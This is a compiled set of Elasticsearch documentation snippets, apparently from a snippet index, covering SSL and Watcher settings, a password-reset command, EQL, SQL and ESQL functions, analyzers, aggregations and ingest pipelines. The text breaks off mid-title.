https://github.com/elastic/elasticsearch/blob/main/docs/extend/example-text-analysis-plugin.md#2025-04-21_snippet_3\n\nLANGUAGE: sh\nCODE:\n```\ngradle bundlePlugin\n```\n\n----------------------------------------\n\nTITLE: PKCS#12 SSL Configuration Settings\nDESCRIPTION: Configuration settings for using PKCS#12 files for SSL in Elasticsearch. Includes settings for keystore path, type, passwords, and truststore configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.http.ssl.keystore.path: path/to/keystore.p12\nxpack.http.ssl.keystore.type: PKCS12\nxpack.http.ssl.keystore.secure_password: keystorepass\nxpack.http.ssl.keystore.secure_key_password: keypass\nxpack.http.ssl.truststore.path: path/to/truststore.p12\nxpack.http.ssl.truststore.type: PKCS12\nxpack.http.ssl.truststore.secure_password: truststorepass\n```\n\n----------------------------------------\n\nTITLE: Reset Elastic User Password - Auto-generated\nDESCRIPTION: Example showing how to reset the elastic user's password to an auto-generated value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/reset-password.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-reset-password -u elastic\n```\n\n----------------------------------------\n\nTITLE: String Formatting Restrictions in Java\nDESCRIPTION: Forbidden string formatting methods that use default locale. Developers should use org.elasticsearch.common.Strings#format instead to ensure consistent string formatting behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-server-signatures.txt#2025-04-21_snippet_4\n\nLANGUAGE: java\nCODE:\n```\njava.lang.String#formatted(java.lang.Object[])\njava.lang.String#format(java.lang.String,java.lang.Object[])\n```\n\n----------------------------------------\n\nTITLE: Demonstrating stringContains Function in EQL\nDESCRIPTION: The stringContains function returns true if a source string contains a provided substring. It is case-sensitive by default but can be made case-insensitive. The function handles null values and empty strings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-function-ref.md#2025-04-21_snippet_13\n\nLANGUAGE: eql\nCODE:\n```\n// process.command_line = \"start regsvr32.exe\"\nstringContains(process.command_line, \"regsvr32\")  // returns true\nstringContains(process.command_line, \"Regsvr32\")  // returns false\nstringContains(process.command_line, \"start \")    // returns true\nstringContains(process.command_line, \"explorer\")  // returns false\n\n// Make matching case-insensitive\nstringContains~(process.command_line, \"Regsvr32\")  // returns false\n\n// process.name = \"regsvr32.exe\"\nstringContains(command_line, process.name)        // returns true\n\n// empty strings\nstringContains(\"\", \"\")                            // returns false\nstringContains(process.command_line, \"\")          // returns false\n\n// null handling\nstringContains(null, \"regsvr32\")                  // returns null\nstringContains(process.command_line, null)        // returns null\n```\n\n----------------------------------------\n\nTITLE: Required GCE Instance Permissions\nDESCRIPTION: Specifies the minimum required permissions scope (compute-rw) for GCE instances to work properly with Elasticsearch discovery plugin.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-long.md#2025-04-21_snippet_5\n\nLANGUAGE: text\nCODE:\n```\nscopes=compute-rw\n```\n\n----------------------------------------\n\nTITLE: Performing Pivot Operation with SUM on Salary\nDESCRIPTION: This snippet demonstrates how to use the `PIVOT` clause to aggregate `salary` data based on distinct values of the `languages` column. It performs a pivot operation that will rotate the rows into columns based on the aggregation function provided.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_30\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM test_emp PIVOT (SUM(salary) FOR languages IN (1, 2)) LIMIT 5;\n```\n\n----------------------------------------\n\nTITLE: Implementing French Analyzer in Elasticsearch\nDESCRIPTION: Custom implementation of the built-in French analyzer with elision filter, French stopwords, keyword marker for exclusions from stemming, and light French stemming.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_14\n\nLANGUAGE: console\nCODE:\n```\nPUT /french_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"french_elision\": {\n          \"type\":         \"elision\",\n          \"articles_case\": true,\n          \"articles\": [\n              \"l\", \"m\", \"t\", \"qu\", \"n\", \"s\",\n              \"j\", \"d\", \"c\", \"jusqu\", \"quoiqu\",\n              \"lorsqu\", \"puisqu\"\n            ]\n        },\n        \"french_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_french_\" <1>\n        },\n        \"french_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"Example\"] <2>\n        },\n        \"french_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"light_french\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_french\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"french_elision\",\n            \"lowercase\",\n            \"french_stop\",\n            \"french_keywords\",\n            \"french_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Enriched Geohex to Shape Ingest Pipeline in Elasticsearch\nDESCRIPTION: Creates an ingest pipeline that converts H3 cells to polygons and adds enriched fields like parent, children, and non-children tiles.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/ingest-geo-grid-processor.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/geohex2shape\n{\n  \"description\": \"translate H3 cell to polygon with enriched fields\",\n  \"processors\": [\n    {\n      \"geo_grid\": {\n        \"description\": \"Ingest H3 cells like '811fbffffffffff' and create polygons\",\n        \"field\": \"geocell\",\n        \"tile_type\": \"geohex\",\n        \"target_format\": \"wkt\",\n        \"target_field\": \"shape\",\n        \"parent_field\": \"parent\",\n        \"children_field\": \"children\",\n        \"non_children_field\": \"nonChildren\",\n        \"precision_field\": \"precision\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: EQL Pattern Comparison Keywords\nDESCRIPTION: Shows the usage of 'like' and 'regex' keywords for case-sensitive and case-insensitive pattern matching in EQL queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_5\n\nLANGUAGE: eql\nCODE:\n```\nmy_field like  \"VALUE*\"         // case-sensitive wildcard matching\nmy_field like~ \"value*\"         // case-insensitive wildcard matching\n\nmy_field regex  \"VALUE[^Z].?\"   // case-sensitive regex matching\nmy_field regex~ \"value[^z].?\"   // case-insensitive regex matching\n```\n\n----------------------------------------\n\nTITLE: Handling Missing Values in Percentile Ranks Aggregation\nDESCRIPTION: Demonstrates how to handle documents with missing values in percentile ranks aggregation by specifying a default value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-percentile-rank-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"load_time_ranks\": {\n      \"percentile_ranks\": {\n        \"field\": \"load_time\",\n        \"values\": [ 500, 600 ],\n        \"missing\": 10\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Runtime Fields with MAD Aggregation\nDESCRIPTION: Shows how to use runtime fields to modify the scale of ratings before calculating median absolute deviation, including field transformation using a script.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-median-absolute-deviation-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET reviews/_search?filter_path=aggregations\n{\n  \"size\": 0,\n  \"runtime_mappings\": {\n    \"rating.out_of_ten\": {\n      \"type\": \"long\",\n      \"script\": {\n        \"source\": \"emit(doc['rating'].value * params.scaleFactor)\",\n        \"params\": {\n          \"scaleFactor\": 2\n        }\n      }\n    }\n  },\n  \"aggs\": {\n    \"review_average\": {\n      \"avg\": {\n        \"field\": \"rating.out_of_ten\"\n      }\n    },\n    \"review_variability\": {\n      \"median_absolute_deviation\": {\n        \"field\": \"rating.out_of_ten\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: IP Prefix Aggregation with Appended Prefix Length\nDESCRIPTION: Shows IP prefix aggregation with the prefix length appended to the IP address keys in the response.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-ipprefix-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /network-traffic/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"ipv4-subnets\": {\n      \"ip_prefix\": {\n        \"field\": \"ipv4\",\n        \"prefix_length\": 24,\n        \"append_prefix_length\": true\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring ILM Policy with Disabled Migration\nDESCRIPTION: Example of an ILM policy where automatic migration is disabled and custom node allocation rules are specified using rack_id attributes. This allows for manual control over index placement.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-migrate.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"warm\": {\n        \"actions\": {\n          \"migrate\" : {\n           \"enabled\": false\n          },\n          \"allocate\": {\n            \"include\" : {\n              \"rack_id\": \"one,two\"\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Semantic Text Highlighting Query\nDESCRIPTION: Example of using the Search API with highlighting to extract relevant fragments from semantic text fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/semantic-text.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST test-index/_search\n{\n    \"query\": {\n        \"match\": {\n            \"my_semantic_field\": \"Which country is Paris in?\"\n        }\n    },\n    \"highlight\": {\n        \"fields\": {\n            \"my_semantic_field\": {\n                \"number_of_fragments\": 2,\n                \"order\": \"score\"\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Excluding Documents with Nested Queries\nDESCRIPTION: This snippet shows how to exclude documents with matching nested query objects using an outer 'must_not' clause in Elasticsearch search, focusing on the 'comments' author field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-nested-query.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST my-index/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must_not\": [\n        {\n          \"nested\": {\n            \"path\": \"comments\",\n            \"query\": {\n              \"term\": {\n                \"comments.author\": \"nik9000\"\n              }\n            }\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Median Absolute Deviation using MV_MEDIAN_ABSOLUTE_DEVIATION in ESQL\nDESCRIPTION: This snippet demonstrates how to use the MV_MEDIAN_ABSOLUTE_DEVIATION function in ESQL to convert a multivalued field into a single value containing the median absolute deviation. It also calculates the median for comparison using MV_MEDIAN.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/mv_median_absolute_deviation.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW values = [0, 2, 5, 6]\n| EVAL median_absolute_deviation = MV_MEDIAN_ABSOLUTE_DEVIATION(values), median = MV_MEDIAN(values)\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Query with Terms Set and Minimum Should Match Script\nDESCRIPTION: Example Elasticsearch query demonstrating how to use terms_set with a minimum_should_match_script to find documents matching at least two actors from a list of three specified actors.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-min-should-match-context.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET seats/_search\n{\n  \"query\": {\n    \"terms_set\": {\n      \"actors\": {\n        \"terms\": [\n          \"smith\",\n          \"earns\",\n          \"black\"\n        ],\n        \"minimum_should_match_script\": {\n          \"source\": \"Math.min(params['num_terms'], params['min_actors_to_see'])\",\n          \"params\": {\n            \"min_actors_to_see\": 2\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Wrapper Query with Base64 Encoded Search Terms in Elasticsearch\nDESCRIPTION: Example of the Wrapper query that accepts a base64 encoded query string. The encoded string represents a term query searching for documents where user.id equals \"kimchy\". This is particularly useful in Spring Data Elasticsearch when adding custom queries via @Query() annotations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-wrapper-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"wrapper\": {\n      \"query\": \"eyJ0ZXJtIiA6IHsgInVzZXIuaWQiIDogImtpbWNoeSIgfX0=\" <1>\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Non-Keyed Percentile Ranks Response in Elasticsearch\nDESCRIPTION: Shows how to configure the percentile ranks aggregation to return results as an array instead of a hash by setting keyed to false.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-percentile-rank-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"load_time_ranks\": {\n      \"percentile_ranks\": {\n        \"field\": \"load_time\",\n        \"values\": [ 500, 600 ],\n        \"keyed\": false\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Null Safe Equality (<=>) Operator in Elasticsearch SQL - Example 1\nDESCRIPTION: Demonstrates how the null safe equality (<=>) operator handles comparison with NULL values. This example compares 'elastic' with null, which returns false.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT 'elastic' <=> null AS \"equals\";\n\n    equals\n---------------\nfalse\n```\n\n----------------------------------------\n\nTITLE: PERCENTILE_RANK Aggregation Function in SQL\nDESCRIPTION: Calculates the percentile rank for a given value within a distribution. Supports different algorithms (tdigest or hdr) and configuration parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_12\n\nLANGUAGE: sql\nCODE:\n```\nSELECT languages, PERCENTILE_RANK(salary, 65000) AS rank FROM emp GROUP BY languages;\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT languages, PERCENTILE_RANK(salary/12, 5000) AS rank FROM emp GROUP BY languages;\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    languages,\n    ROUND(PERCENTILE_RANK(salary, 65000, 'tdigest', 100.0), 2) AS \"rank_TDigest\",\n    ROUND(PERCENTILE_RANK(salary, 65000, 'hdr', 3), 2) AS \"rank_HDR\"\nFROM emp\nGROUP BY languages;\n```\n\n----------------------------------------\n\nTITLE: Configuring Domain Allowlist for Email Notifications in Elasticsearch YAML\nDESCRIPTION: Specifies domains to which emails are allowed to be sent. Supports simple globbing patterns like \"*.company.com\". Cannot be used together with recipient_allowlist.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.notification.email.account.domain_allowlist\n```\n\n----------------------------------------\n\nTITLE: Histogram Aggregations in Elasticsearch SQL\nDESCRIPTION: Examples of histogram-based grouping with different intervals (years, months, days) and ordering options. Includes calendar and fixed interval configurations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nSELECT MAX(int) FROM test GROUP BY HISTOGRAM(date, INTERVAL 2 YEARS);\n```\n\nLANGUAGE: elasticsearch\nCODE:\n```\n\"date_histogram\":{\"field\":\"date\",\"missing_bucket\":true,\"order\":\"asc\",\"fixed_interval\":\"62208000000ms\",\"time_zone\":\"Z\"}}]}\n```\n\n----------------------------------------\n\nTITLE: Selecting Data with Multi-Target Pattern in Elasticsearch SQL\nDESCRIPTION: Demonstrates querying data from multiple indices using a pattern that matches tables starting with 'e' and ending with 'p'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-index-patterns.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT emp_no FROM \"e*p\" LIMIT 1;\n```\n\n----------------------------------------\n\nTITLE: Retrieving Stored Fields in Elasticsearch Search\nDESCRIPTION: Example of using the stored_fields parameter to selectively load specific fields that have been explicitly marked as stored in the mapping, which is different from standard source filtering.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-selected-fields.md#2025-04-21_snippet_10\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"stored_fields\" : [\"user\", \"postDate\"],\n  \"query\" : {\n    \"term\" : { \"user\" : \"kimchy\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Input and Output Fields for Inference Processor in Elasticsearch\nDESCRIPTION: Configures an inference processor to select the 'content' field for inference and write the result to 'content_embedding'. This example demonstrates the basic setup of input/output field mapping for inference.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/inference-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"inference\": {\n    \"model_id\": \"model_deployment_for_inference\",\n    \"input_output\": [\n        {\n            \"input_field\": \"content\",\n            \"output_field\": \"content_embedding\"\n        }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Monthly to Annual Rate Conversion Query\nDESCRIPTION: Demonstrates grouping sales records into monthly buckets and converting to annual rates using date_histogram and rate aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-rate-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"by_date\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"my_rate\": {\n          \"rate\": {\n            \"unit\": \"year\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Unary Negative Operator with 'def' Type in Painless\nDESCRIPTION: This example demonstrates how the unary negative operator '-' functions with the 'def' type in Painless, showing implicit casting and type handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_11\n\nLANGUAGE: painless\nCODE:\n```\ndef z = -1;\nint i = -z;\n```\n\n----------------------------------------\n\nTITLE: ESQL Date Formatting Function Documentation Comment\nDESCRIPTION: Documentation comment for an ESQL function that converts date values to formatted strings based on a provided format pattern. The comment indicates this is an auto-generated file that should not be manually edited.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/date_format.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nReturns a string representation of a date, in the provided format.\n```\n\n----------------------------------------\n\nTITLE: Configuring Test Skipping for Breaking Changes in Gradle\nDESCRIPTION: Gradle configuration example showing how to skip specific compatibility tests when handling intentional breaking changes. Allows temporarily disabling tests that are known to fail due to breaking changes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/REST_API_COMPATIBILITY.md#2025-04-21_snippet_9\n\nLANGUAGE: groovy\nCODE:\n```\ntasks.named(\"yamlRestCompatTestTransform\").configure({task ->\n    task.skipTest(\"range/20_synthetic_source/Date range\", \"date range breaking change causes tests to produce incorrect values for compatibility\")\n    task.skipTest(\"indices.sort/10_basic/Index Sort\", \"warning does not exist for compatibility\")\n    task.skipTest(\"search/330_fetch_fields/Test search rewrite\", \"warning does not exist for compatibility\")\n    task.skipTestsByFilePattern(\"indices.create/synthetic_source*.yml\", \"@UpdateForV9 -> tests do not pass after bumping API version to 9 [ES-9597]\")\n})\n```\n\n----------------------------------------\n\nTITLE: Example Search Response with Early Termination\nDESCRIPTION: Shows the response format when using early termination in search queries, where total hits are not tracked.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/sorting.md#2025-04-21_snippet_5\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"_shards\": ...\n   \"hits\" : {\n      \"max_score\" : null,\n      \"hits\" : []\n  },\n  \"took\": 20,\n  \"timed_out\": false\n}\n```\n\n----------------------------------------\n\nTITLE: Collecting stream elements with CancellableCollector\nDESCRIPTION: This snippet shows how to apply a CancellableCollector to a stream to collect elements while allowing for cancellation during the process.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/vector-tile/licenses/slf4j-nop-NOTICE.txt#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nList<Result> results = sourceStream\n    .map(this::processItem)\n    .collect(cancellableCollector);\n```\n\n----------------------------------------\n\nTITLE: ANYSTRING Operator Examples\nDESCRIPTION: Examples showing the at sign operator which matches any entire string, and how to combine it with other operators for exclusion patterns.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_17\n\nLANGUAGE: text\nCODE:\n```\n@&~(abc.+)  # matches everything except terms beginning with 'abc'\n```\n\n----------------------------------------\n\nTITLE: Input Document Before Dot Expansion\nDESCRIPTION: Shows an example document with a field containing dots before processing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dot-expand-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"foo.bar\" : \"value\"\n}\n```\n\n----------------------------------------\n\nTITLE: Assigning Array Values in ESQL\nDESCRIPTION: Creates a row variable 'a' containing an array with two integer values [2, 1]. Demonstrates basic array literal syntax and variable assignment in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/row.csv-spec/multivalue.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = [2, 1]\n```\n\n----------------------------------------\n\nTITLE: Defining GeoShapeValue Inner Class in Java for Elasticsearch Spatial Module\nDESCRIPTION: This code defines the GeoShapeValue class as an inner class of GeoShapeValues in Elasticsearch's spatial module. The class appears to be a placeholder or base class for handling geo-shape values in field data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/spatial/src/main/resources/org/elasticsearch/xpack/spatial/org.elasticsearch.xpack.spatial.index.fielddata.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nclass org.elasticsearch.xpack.spatial.index.fielddata.GeoShapeValues$GeoShapeValue {\n}\n```\n\n----------------------------------------\n\nTITLE: ST_CONTAINS Documentation Structure\nDESCRIPTION: Base structure of the ST_CONTAINS function documentation showing the main sections including syntax diagram, parameters, description, types, and examples.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/st_contains.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `ST_CONTAINS` [esql-st_contains]\n\n**Syntax**\n\n:::{image} ../../../images/functions/st_contains.svg\n:alt: Embedded\n:class: text-center\n:::\n\n:::{include} ../parameters/st_contains.md\n:::\n\n:::{include} ../description/st_contains.md\n:::\n\n:::{include} ../types/st_contains.md\n:::\n\n:::{include} ../examples/st_contains.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Copyright Notice for Elasticsearch X-Pack\nDESCRIPTION: Standard copyright header declaring ownership by Elasticsearch and the years of copyright coverage\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nElasticsearch X-Pack\nCopyright 2009-2017 Elasticsearch\n```\n\n----------------------------------------\n\nTITLE: Complete Bucket Correlation Example for Correlating Version with Latency\nDESCRIPTION: This example demonstrates how to correlate term values in a 'version' field with a 'latency' metric. It uses range aggregation to create latency buckets and then applies bucket correlation to determine the relationship between versions and latency patterns.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-correlation-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST correlate_latency/_search?size=0&filter_path=aggregations\n{\n  \"aggs\": {\n    \"buckets\": {\n      \"terms\": { <1>\n        \"field\": \"version\",\n        \"size\": 2\n      },\n      \"aggs\": {\n        \"latency_ranges\": {\n          \"range\": { <2>\n            \"field\": \"latency\",\n            \"ranges\": [\n              { \"to\": 0.0 },\n              { \"from\": 0, \"to\": 105 },\n              { \"from\": 105, \"to\": 225 },\n              { \"from\": 225, \"to\": 445 },\n              { \"from\": 445, \"to\": 665 },\n              { \"from\": 665, \"to\": 885 },\n              { \"from\": 885, \"to\": 1115 },\n              { \"from\": 1115, \"to\": 1335 },\n              { \"from\": 1335, \"to\": 1555 },\n              { \"from\": 1555, \"to\": 1775 },\n              { \"from\": 1775 }\n            ]\n          }\n        },\n        \"bucket_correlation\": { <3>\n          \"bucket_correlation\": {\n            \"buckets_path\": \"latency_ranges>_count\",\n            \"function\": {\n              \"count_correlation\": {\n                \"indicator\": {\n                   \"expectations\": [0, 52.5, 165, 335, 555, 775, 1000, 1225, 1445, 1665, 1775],\n                   \"doc_count\": 200\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Sample Log Line Format for Dissect Parsing\nDESCRIPTION: An example log line that would be matched by the dissect pattern. This represents a typical HTTP access log entry with IP address, timestamp, HTTP method, URL, and status code.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dissect-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: txt\nCODE:\n```\n1.2.3.4 - - [30/Apr/1998:22:00:52 +0000] \\\"GET /english/venues/cities/images/montpellier/18.gif HTTP/1.0\\\" 200 3171\n```\n\n----------------------------------------\n\nTITLE: Querying Data from Frozen Indices in Elasticsearch SQL\nDESCRIPTION: Example of using the FROZEN keyword in the FROM clause to explicitly query data from a frozen index named 'archive'. The query limits the results to a single row and displays all columns.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-index-frozen.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM FROZEN archive LIMIT 1;\n\n     author      |        name        |  page_count   |    release_date\n-----------------+--------------------+---------------+--------------------\nJames S.A. Corey |Leviathan Wakes     |561            |2011-06-02T00:00:00Z\n```\n\n----------------------------------------\n\nTITLE: ESQL TOP Function Documentation Header\nDESCRIPTION: Markdown header and warning comment indicating this is auto-generated documentation for the TOP function in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/top.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `TOP` [esql-top]\n```\n\n----------------------------------------\n\nTITLE: Converting WKT String to Geo Shape in ESQL\nDESCRIPTION: This snippet demonstrates how to use the TO_GEOSHAPE function to convert a Well-Known Text (WKT) string representation of a polygon into a geo_shape value. The function accepts a string input in WKT format and returns a geo_shape object that can be used in geospatial queries and aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_geoshape.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW wkt = \"POLYGON ((30 10, 40 40, 20 40, 10 20, 30 10))\"\n| EVAL geom = TO_GEOSHAPE(wkt)\n```\n\n----------------------------------------\n\nTITLE: Querying Multiple Fields with Wildcards in YAML\nDESCRIPTION: This example demonstrates querying multiple fields using wildcards within KQL, including considerations for potential errors due to field type mismatches.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/kql.md#2025-04-21_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\ndatastream.*: logs\n```\n\n----------------------------------------\n\nTITLE: Defining Arabic Stop Words\nDESCRIPTION: Defines the Arabic stop words for use in Elasticsearch text analysis. It provides a link to the corresponding stop words text file in Lucene.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\n`_arabic_`\n:   [Arabic stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/ar/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Configuring Field Data Cache Size in Elasticsearch\nDESCRIPTION: Static cluster setting that defines the maximum size of the field data cache. Can be set as a percentage of heap space or absolute value. Should be configured smaller than the field data circuit breaker limit.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/field-data-cache-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nindices.fielddata.cache.size\n```\n\n----------------------------------------\n\nTITLE: EQL Single Numeric Filter 